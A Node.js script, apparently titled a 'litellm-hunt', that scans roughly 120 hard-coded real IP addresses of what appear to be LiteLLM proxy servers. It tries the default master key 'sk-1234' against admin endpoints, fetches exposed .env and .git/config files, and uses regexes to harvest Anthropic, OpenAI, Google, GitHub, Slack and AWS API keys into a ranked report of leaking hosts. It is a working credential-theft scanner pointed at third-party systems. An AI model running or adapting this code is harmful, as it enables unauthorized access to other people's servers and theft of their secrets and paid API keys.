#!/usr/bin/env node
const fs = require('fs');
const path = require('path');

const OUT_DIR = path.join(__dirname, '..', 'docs', 'litellm-hunt');
const OUT_FILE = process.argv[2] ? path.resolve(process.argv[2]) : path.join(OUT_DIR, 'report.json');
const TIMEOUT_MS = 6500;
const TARGET_POOL = 14;
const PROBE_POOL = 6;

const DEFAULT_KEY = 'sk-1234';

const TARGETS = [
  { host: '42.51.45.12', port: 4001, note: 'CN Zhengzhou Fastidc' },
  { host: '107.175.1.25', port: 4000, note: 'US Buffalo HostPapa' },
  { host: '51.84.218.27', port: 3000, note: 'IL Tel Aviv AWS' },
  { host: '18.193.45.240', port: 60000, note: 'DE Frankfurt AWS' },
  { host: '88.99.213.222', port: 4000, note: 'DE Falkenstein Hetzner (new-api)' },
  { host: '34.204.120.143', port: 80, note: 'US Ashburn AWS' },
  { host: '152.32.219.61', port: 4000, note: 'SG UCloud' },
  { host: '35.215.54.98', port: 5000, note: 'CA Montreal GCP' },
  { host: '204.168.180.113', port: 4000, note: 'FI Helsinki Hetzner' },
  { host: '108.137.96.201', port: 2443, note: 'ID Jakarta AWS' },
  { host: '44.241.19.189', port: 443, note: 'US Oregon AWS' },
  { host: '107.172.16.204', port: 4000, note: 'US Santa Clara HostPapa (Akamai WAF)' },
  { host: '18.227.40.43', port: 443, note: 'US Ohio AWS' },
  { host: '119.45.115.224', port: 4000, note: 'CN Nanjing Tencent' },
  { host: '38.207.177.14', port: 443, note: 'HK LucidaCloud' },
  { host: '45.76.178.144', port: 4000, note: 'SG Vultr' },
  { host: '15.188.89.136', port: 8085, note: 'FR Paris AWS' },
  { host: '51.210.9.156', port: 4000, note: 'FR Strasbourg OVH' },
  { host: '34.125.174.225', port: 443, note: 'US Las Vegas GCP' },
  { host: '108.61.199.202', port: 443, note: 'NL Haarlem Vultr' },
  { host: '54.209.115.183', port: 80, note: 'US Ashburn AWS' },
  { host: '54.209.115.183', port: 443, note: 'US Ashburn AWS' },
  { host: '18.206.10.209', port: 80, note: 'US Ashburn AWS' },
  { host: '34.8.20.34', port: 443, note: 'US Kansas GCP' },
  { host: '174.138.25.51', port: 443, note: 'SG DigitalOcean' },
  { host: '174.138.25.51', port: 4000, note: 'SG DigitalOcean' },
  { host: '139.199.68.168', port: 4000, note: 'CN Guangzhou Tencent' },
  { host: '35.82.149.23', port: 80, note: 'US Oregon AWS' },
  { host: '34.245.179.218', port: 4433, note: 'IE Dublin AWS' },
  { host: '85.137.164.136', port: 9443, note: 'CZ SmartApe' },
  { host: '144.126.209.152', port: 4000, note: 'US Santa Clara DO' },
  { host: '2a01:4f8:c015:f412::1', port: 443, note: 'DE Falkenstein Hetzner IPv6' },
  { host: '119.29.59.47', port: 443, note: 'CN Guangzhou Tencent' },
  { host: '20.115.208.7', port: 4000, note: 'US WA Microsoft' },
  { host: '133.186.146.224', port: 8081, note: 'KR Seoul NHN' },
  { host: '218.108.80.210', port: 8443, note: 'CN Shanghai Huashu' },
  { host: '18.134.57.53', port: 443, note: 'GB London AWS' },
  { host: '20.38.37.3', port: 4001, note: 'US Phoenix Microsoft' },
  { host: '20.38.37.3', port: 4008, note: 'US Phoenix Microsoft' },
  { host: '20.38.37.3', port: 5008, note: 'US Phoenix Microsoft' },
  { host: '20.38.37.3', port: 5045, note: 'US Phoenix Microsoft' },
  { host: '20.38.37.3', port: 5078, note: 'US Phoenix Microsoft' },
  { host: '140.206.41.206', port: 9840, note: 'CN Shanghai Unicom (Synology)' },
  { host: '54.167.134.104', port: 80, note: 'US Ashburn AWS' },
  { host: '54.167.134.104', port: 443, note: 'US Ashburn AWS' },
  { host: '3.213.207.208', port: 443, note: 'US Ashburn AWS' },
  { host: '100.58.144.175', port: 443, note: 'US Ashburn AWS' },
  { host: '3.229.174.71', port: 443, note: 'US Ashburn AWS' },
  { host: '98.87.14.9', port: 80, note: 'US Ashburn AWS' },
  { host: '51.254.138.61', port: 4000, note: 'FR Dunkirk OVH' },
  { host: '192.3.114.211', port: 443, note: 'US Elk Grove HostPapa' },
  { host: '52.54.130.116', port: 80, note: 'US Ashburn AWS' },
  { host: '43.139.35.69', port: 4000, note: 'CN Guangzhou Tencent' },
  { host: '43.139.35.69', port: 4100, note: 'CN Guangzhou Tencent' },
  { host: '152.53.49.51', port: 4000, note: 'AT Vienna netcup' },
  { host: '146.190.82.16', port: 4000, note: 'SG DigitalOcean' },
  { host: '15.236.152.34', port: 443, note: 'FR Paris AWS (Dashboard)' },
  { host: '57.128.228.102', port: 443, note: 'PL Warsaw OVH' },
  { host: '184.32.124.11', port: 80, note: 'US Oregon AWS' },
  { host: '113.46.229.58', port: 80, note: 'CN Guangzhou Huawei' },
  { host: '54.160.50.203', port: 443, note: 'US Ashburn AWS' },
  { host: '15.206.14.199', port: 4000, note: 'IN Mumbai AWS' },
  { host: '54.208.187.218', port: 80, note: 'US Ashburn AWS' },
  { host: '1.92.135.136', port: 4000, note: 'CN Beijing Huawei' },
  { host: '40.176.245.117', port: 7443, note: 'CA Calgary AWS' },
  { host: '129.146.200.116', port: 443, note: 'US Phoenix Oracle' },
  { host: '129.146.200.116', port: 7800, note: 'US Phoenix Oracle' },
  { host: '18.118.118.215', port: 443, note: 'US Ohio AWS' },
  { host: '100.59.149.63', port: 443, note: 'US Ashburn AWS' },
  { host: '100.59.149.63', port: 80, note: 'US Ashburn AWS' },
  { host: '213.171.186.119', port: 4000, note: 'IT SEEWEB' },
  { host: '213.171.186.119', port: 8000, note: 'IT SEEWEB' },
  { host: '213.171.186.119', port: 8001, note: 'IT SEEWEB' },
  { host: '213.171.186.119', port: 8002, note: 'IT SEEWEB' },
  { host: '194.163.135.86', port: 4000, note: 'FR Contabo' },
  { host: '194.163.135.86', port: 443, note: 'FR Contabo' },
  { host: '3.65.216.51', port: 443, note: 'DE Frankfurt AWS' },
  { host: '144.126.143.124', port: 4000, note: 'US Contabo' },
  { host: '82.38.65.227', port: 4000, note: 'PL HOSTKEY' },
  { host: '82.38.65.227', port: 8443, note: 'PL HOSTKEY' },
  { host: '217.61.208.94', port: 4000, note: 'ES Loading' },
  { host: '217.61.208.94', port: 443, note: 'ES Loading' },
  { host: '217.61.208.94', port: 3001, note: 'ES Loading' },
  { host: '165.232.76.189', port: 8444, note: 'DE DO' },
  { host: '165.232.76.189', port: 8443, note: 'DE DO' },
  { host: '43.135.135.12', port: 21374, note: 'US Tencent' },
  { host: '173.212.251.148', port: 443, note: 'FR Contabo' },
  { host: '65.108.213.94', port: 443, note: 'FI Hetzner' },
  { host: '217.61.208.75', port: 4000, note: 'ES Loading' },
  { host: '217.61.208.75', port: 443, note: 'ES Loading' },
  { host: '217.61.208.75', port: 3001, note: 'ES Loading' },
  { host: '161.97.95.156', port: 4000, note: 'FR Contabo' },
  { host: '158.180.27.170', port: 4000, note: 'DE Oracle' },
  { host: '119.45.222.120', port: 8888, note: 'CN Nanjing Tencent (AI Gateway)' },
  { host: '119.45.222.120', port: 3001, note: 'CN Nanjing Tencent' },
  { host: '119.45.222.120', port: 18080, note: 'CN Nanjing Tencent' },
  { host: '119.45.222.120', port: 18082, note: 'CN Nanjing Tencent' },
  { host: '119.45.222.120', port: 18084, note: 'CN Nanjing Tencent' },
  { host: '158.255.7.17', port: 4000, note: 'RU Moscow HOSTKEY' },
  { host: '158.255.7.17', port: 3001, note: 'RU Moscow HOSTKEY' },
  { host: '45.8.148.222', port: 4000, note: 'DE Contabo' },
  { host: '45.8.148.222', port: 443, note: 'DE Contabo' },
  { host: '45.8.148.222', port: 3001, note: 'DE Contabo' },
  { host: '35.168.103.231', port: 80, note: 'US Ashburn AWS' },
  { host: '18.220.49.26', port: 80, note: 'US Ohio AWS' },
  { host: '176.144.39.167', port: 4000, note: 'FR Bouygues' },
  { host: '176.144.39.167', port: 443, note: 'FR Bouygues' },
  { host: '122.155.10.75', port: 4000, note: 'TH Bangkok' },
  { host: '122.155.10.75', port: 443, note: 'TH Bangkok' },
  { host: '122.51.66.129', port: 443, note: 'CN Shanghai Tencent' },
  { host: '122.51.66.129', port: 63333, note: 'CN Shanghai Tencent' },
  { host: '128.61.240.79', port: 41414, note: 'US Georgia Tech' },
  { host: '128.61.240.79', port: 41416, note: 'US Georgia Tech' },
  { host: '128.61.240.79', port: 41417, note: 'US Georgia Tech' },
  { host: '15.156.96.202', port: 8001, note: 'CA Montreal AWS' },
  { host: '94.72.114.241', port: 443, note: 'US Contabo' },
  { host: '94.72.114.241', port: 3000, note: 'US Contabo' },
  { host: '94.72.114.241', port: 18781, note: 'US Contabo' },
  { host: '94.72.114.241', port: 18782, note: 'US Contabo' },
  { host: '3.150.68.206', port: 443, note: 'US Ohio AWS' },
];

const HTTPS_PORTS = new Set([443, 2443, 4433, 4443, 7443, 8443, 8444, 9443, 9840]);

const PROBES = [
  { name: 'docs', url: '/docs' },
  { name: 'openapi', url: '/openapi.json' },
  { name: 'health', url: '/health' },
  { name: 'models_anon', url: '/v1/models' },
  { name: 'modelinfo_dk', url: '/model/info', auth: DEFAULT_KEY },
  { name: 'keyinfo_dk', url: '/key/info', auth: DEFAULT_KEY },
  { name: 'userinfo_dk', url: '/user/info', auth: DEFAULT_KEY },
  { name: 'configyaml_dk', url: '/config/yaml', auth: DEFAULT_KEY },
  { name: 'models_dk', url: '/v1/models', auth: DEFAULT_KEY },
  { name: 'env', url: '/.env' },
  { name: 'env_app', url: '/app/.env' },
  { name: 'env_backend', url: '/backend/.env' },
  { name: 'env_prod', url: '/.env.production' },
  { name: 'git', url: '/.git/config' },
  { name: 'cfg', url: '/config.yaml' },
  { name: 'cfg2', url: '/litellm_config.yaml' },
  { name: 'cfg3', url: '/litellm-config.yaml' },
  { name: 'config_json', url: '/config.json' },
  { name: 'api_status', url: '/api/status' },
];

const KEY_RE = /(sk-ant-[A-Za-z0-9_\-]{16,}|sk-proj-[A-Za-z0-9_\-]{16,}|sk-[A-Za-z0-9_\-]{24,}|AIza[0-9A-Za-z_\-]{30,}|ghp_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{20,}|xox[baprs]-[A-Za-z0-9\-]{10,}|AKIA[0-9A-Z]{16})/g;
const ENV_KEY_RE = /(ANTHROPIC_API_KEY|OPENAI_API_KEY|OPENAI_API_BASE|GOOGLE_API_KEY|GEMINI_API_KEY|MASTER_KEY|LITELLM_MASTER_KEY|CODEX_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|AZURE_OPENAI_API_KEY)\s*[=:]\s*["']?([A-Za-z0-9_\-\.]{10,})/gi;
const JSON_KEY_RE = /"(?:api_key|master_key|token|key|decrypted_api_key|litellm_key)"\s*:\s*"([A-Za-z0-9_\-\.]{10,})"/gi;

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36';

function mask(secret) {
  if (!secret || secret.length < 10) return secret;
  if (secret.length <= 16) return secret.slice(0, 4) + '…' + secret.slice(-4);
  return secret.slice(0, 7) + '…' + secret.slice(-6);
}

function collectKeys(body, set) {
  const text = typeof body === 'string' ? body : JSON.stringify(body || '');
  let m;
  const rx = new RegExp(KEY_RE.source, 'g');
  while ((m = rx.exec(text))) set.add(m[1]);
  const rx2 = new RegExp(ENV_KEY_RE.source, 'gi');
  while ((m = rx2.exec(text))) set.add(m[2]);
  const rx3 = new RegExp(JSON_KEY_RE.source, 'gi');
  while ((m = rx3.exec(text))) set.add(m[1]);
  return set;
}

async function requestOnce(target, scheme, urlPath, auth, tag) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), TIMEOUT_MS);
  const headers = { 'user-agent': UA, accept: '*/*' };
  if (auth) headers.authorization = 'Bearer ' + auth;
  const host = target.host.includes(':') ? `[${target.host}]` : target.host;
  const url = `${scheme}://${host}:${target.port}${urlPath}`;
  const start = Date.now();
  try {
    const res = await fetch(url, { headers, redirect: 'follow', signal: controller.signal });
    const ct = res.headers.get('content-type') || '';
    const isJson = ct.includes('json');
    const buf = await res.arrayBuffer();
    const text = Buffer.from(buf).toString('utf8').slice(0, 60000);
    let body = text;
    if (isJson) {
      try { body = JSON.parse(text); } catch { body = text; }
    }
    return {
      ok: res.ok,
      status: res.status,
      ct,
      scheme,
      ms: Date.now() - start,
      body,
      text,
      bytes: buf.byteLength,
    };
  } catch (err) {
    return { ok: false, status: 0, error: String(err.name || err), scheme, ms: Date.now() - start, body: null, text: '', bytes: 0 };
  } finally {
    clearTimeout(timer);
  }
}

async function probeTarget(target) {
  const httpsFirst = HTTPS_PORTS.has(target.port);
  const schemes = httpsFirst ? ['https', 'http'] : ['http', 'https'];
  const used = { http: false, https: false };
  const findings = [];
  const keySet = new Set();

  const probe = async (p) => {
    for (const scheme of schemes) {
      if (used[scheme]) continue;
      const r = await requestOnce(target, scheme, p.url, p.auth, p.name);
      if (r.status === 0 || (r.ok === false && r.status === 0)) {
        used[scheme] = true;
        continue;
      }
      used[scheme] = true;
      if (r.status >= 200 && r.status < 500) {
        collectKeys(r.text, keySet);
        const isKeyInfo = p.name === 'keyinfo_dk' && r.ok && /"keys?"|"info"/i.test(r.text.slice(0, 2000));
        const isUserInfo = p.name === 'userinfo_dk' && r.ok && /"users?"/i.test(r.text.slice(0, 2000));
        const isModels = p.name.startsWith('models') && r.ok && /"data"|"models"/i.test(r.text.slice(0, 3000));
        const isModelInfo = p.name === 'modelinfo_dk' && r.ok && Array.isArray(r.body) && r.body.length > 0;
        const isConfigYaml = p.name === 'configyaml_dk' && r.ok && /model_list|litellm_settings|general_settings/i.test(r.text.slice(0, 4000));
        const isEnv = /\.env/.test(p.name) && r.ok && /(API_KEY|SECRET|PASSWORD|TOKEN|MASTER)/i.test(r.text.slice(0, 4000));
        const isGit = p.name === 'git' && r.ok && /\[core\]|repositoryformatversion/i.test(r.text.slice(0, 2000));
        const isSwagger = p.name === 'docs' && r.ok && /swagger|liteLLM|LiteLLM/i.test(r.text.slice(0, 2000));
        const isOpenApi = p.name === 'openapi' && r.ok && /(paths|openapi)/i.test(r.text.slice(0, 2000));
        const isHealth = p.name === 'health' && r.ok;
        findings.push({
          probe: p.name,
          status: r.status,
          scheme,
          ms: r.ms,
          ct: r.ct,
          snippet: r.text.slice(0, 300),
          flags: {
            keyInfo: isKeyInfo,
            userInfo: isUserInfo,
            models: isModels,
            modelInfo: isModelInfo,
            configYaml: isConfigYaml,
            env: isEnv,
            git: isGit,
            swagger: isSwagger,
            openapi: isOpenApi,
            health: isHealth,
          },
        });
      }
      break;
    }
  };

  const queue = PROBES.slice();
  async function worker() {
    while (queue.length) {
      const p = queue.shift();
      await probe(p);
    }
  }
  const workers = Array.from({ length: PROBE_POOL }, worker);
  await Promise.all(workers);

  let verdict = 'up';
  const f = findings;
  if (f.some(x => x.flags.keyInfo)) verdict = 'LEAK: default master key sk-1234 -> /key/info';
  else if (f.some(x => x.flags.env)) verdict = 'LEAK: env file';
  else if (f.some(x => x.flags.userInfo)) verdict = 'LEAK: default key -> /user/info';
  else if (f.some(x => x.flags.modelInfo)) verdict = 'LEAK: default key -> /model/info';
  else if (f.some(x => x.flags.configYaml)) verdict = 'LEAK: default key -> /config/yaml';
  else if (f.some(x => x.flags.models)) verdict = 'OPEN: /v1/models без авторизации';
  else if (f.some(x => x.flags.git)) verdict = 'LEAK: .git/config';
  else if (f.some(x => x.flags.health)) verdict = 'UP: litellm отвечает';
  else if (f.some(x => x.flags.swagger || x.flags.openapi)) verdict = 'UP: swagger open, но auth закрыта';
  else if (f.length === 0) verdict = 'down/refused';

  const keys = [...keySet];
  return {
    host: target.host,
    port: target.port,
    note: target.note,
    verdict,
    findings: f,
    keys: keys.slice(0, 30),
    keyCount: keys.length,
  };
}

async function main() {
  fs.mkdirSync(OUT_DIR, { recursive: true });
  const results = [];
  const queue = TARGETS.slice();
  let done = 0;
  async function worker() {
    while (queue.length) {
      const t = queue.shift();
      try {
        const r = await probeTarget(t);
        results.push(r);
      } catch (err) {
        results.push({ host: t.host, port: t.port, note: t.note, verdict: 'error: ' + err.message, findings: [], keys: [], keyCount: 0 });
      }
      done++;
      process.stderr.write(`[${done}/${TARGETS.length}] ${t.host}:${t.port} -> ${results[results.length - 1].verdict}\n`);
    }
  }
  const workers = Array.from({ length: TARGET_POOL }, worker);
  await Promise.all(workers);

  const report = {
    generatedAt: new Date().toISOString(),
    defaultKey: DEFAULT_KEY,
    total: results.length,
    leaked: results.filter(r => r.verdict.startsWith('LEAK')).length,
    open: results.filter(r => r.verdict.startsWith('OPEN')).length,
    up: results.filter(r => r.verdict.startsWith('UP')).length,
    down: results.filter(r => r.verdict === 'down/refused').length,
    errors: results.filter(r => r.verdict.startsWith('error')).length,
    targets: results.sort((a, b) => {
      const rank = v => (v.startsWith('LEAK') ? 0 : v.startsWith('OPEN') ? 1 : v.startsWith('UP') ? 2 : 3);
      return rank(a.verdict) - rank(b.verdict) || a.host.localeCompare(b.host);
    }),
  };
  fs.writeFileSync(OUT_FILE, JSON.stringify(report, null, 2));
  console.log(JSON.stringify(report, null, 2));
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
